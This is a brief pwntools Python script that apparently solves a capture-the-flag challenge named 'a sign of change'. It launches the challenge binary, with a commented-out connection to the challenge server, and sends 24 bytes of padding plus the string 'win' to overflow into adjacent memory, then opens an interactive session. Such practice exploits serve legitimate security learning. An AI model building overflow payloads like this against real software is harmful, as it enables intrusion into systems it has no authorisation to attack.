from pwn import *
#p=remote("fitsec-a-sign-of-change.chals.io", 443, ssl=True, sni="fitsec-a-sign-of-change.chals.io")
p = process("./asignofchange.bin")
p.recvuntil(">>>")
chain = b"A"*24
chain += b"win\0"
p.sendline(chain)
p.interactive()
